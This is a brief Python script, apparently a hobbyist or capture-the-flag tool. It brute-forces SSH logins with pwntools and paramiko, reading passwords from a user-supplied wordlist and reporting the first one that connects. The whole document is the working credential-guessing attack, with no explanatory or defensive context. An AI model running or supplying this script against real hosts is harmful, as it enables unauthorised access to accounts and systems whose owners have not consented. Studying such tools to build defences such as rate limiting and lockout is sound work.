import os
import paramiko.ssh_exception
import requests
from pwn import *
import sys
import paramiko

host = input("Enter your Ip: ")
username = input("Enter your username: ")
attempts = 0

with open (input("Enter the wordlist: "), "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}]Attempting password: '{}'". format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("Valid password found : '{}'".format(password))
                response.close()
                break
            response.close
        except paramiko.ssh_exception.AuthenticationException:
            print("[>] Invalid password")
        attempts +=1
